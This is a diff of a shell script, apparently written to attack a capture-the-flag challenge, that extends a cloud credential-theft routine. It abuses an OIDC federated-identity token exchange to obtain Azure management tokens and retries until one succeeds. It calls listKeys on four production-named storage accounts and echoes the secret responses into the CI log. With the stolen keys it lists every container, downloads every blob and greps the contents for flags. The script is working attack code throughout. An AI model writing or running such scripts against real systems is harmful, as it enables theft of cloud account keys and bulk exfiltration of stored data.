@@ -32,10 +32,30 @@ plist=$(curl -sS -H "Authorization: Bearer $graph" https://graph.microsoft.com/v
 echo PLATFORM_FICS=$(echo "$plist" | head -c 1800)
 plresp=$(curl -sS -X POST "$BASE" -d "client_id=462d1c38-4459-48b8-9333-82e389e59514" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
 plat=$(echo "$plresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
+echo PLATFORM_RESP=$(echo "$plresp" | head -c 800)
 echo PLATFORM_ARM_LEN=${#plat}
+for retry in $(seq 1 8); do
+  if [ -n "$plat" ]; then break; fi
+  sleep 3
+  plresp=$(curl -sS -X POST "$BASE" -d "client_id=462d1c38-4459-48b8-9333-82e389e59514" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
+  plat=$(echo "$plresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
+  echo PLATFORM_RETRY=$retry LEN=${#plat} RESP=$(echo "$plresp" | head -c 300)
+done
 for sa_name in sttblcilogsprodx3euoz sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
   kr=$(curl -sS -w '\nHTTP=%{http_code}' -X POST -d '' -H "Authorization: Bearer $plat" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa_name/listKeys?api-version=2023-01-01")
   echo PLATFORM_KEYS_$sa_name=$(echo "$kr" | head -c 1600)
+  kb=$(echo "$kr" | sed '/HTTP=/,$d')
+  key=$(echo "$kb" | jq -r '.keys[0].value // empty' 2>/dev/null)
+  if [ -n "$key" ]; then
+    for cont in $(az storage container list --account-name "$sa_name" --account-key "$key" --query '[].name' -o tsv 2>/dev/null); do
+      echo PLATFORM_CONTAINER_$sa_name=$cont
+      for blob in $(az storage blob list --account-name "$sa_name" --account-key "$key" --container-name "$cont" --query '[].name' -o tsv 2>/dev/null); do
+        echo PLATFORM_BLOB_$sa_name/$cont=$blob
+        az storage blob download --account-name "$sa_name" --account-key "$key" --container-name "$cont" --name "$blob" --file "/tmp/blob.$RANDOM" --overwrite true -o none 2>/dev/null
+        for f in /tmp/blob.*; do grep -aEo 'DF26\{[^}]+\}' "$f" 2>/dev/null || true; done
+      done
+    done
+  fi
 done
 armresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
 arm=$(echo "$armresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
@@ -69,6 +89,7 @@ echo CUSTOM_LEN=${#custom}
 echo RETRY_MARK=platform_fic_second_exchange
 echo RETRY_MARK2=platform_fic_list
 echo RETRY_MARK3=listkeys_body
+echo RETRY_MARK4=retry_exchange_and_storage
 # Probe the two resources named by the leaked settings.  The custom ArmOwner
 # app-role is not understood by ARM itself, but is accepted by the challenge's
 # internal catalog/debug handlers; keep all response bodies in the Action log.
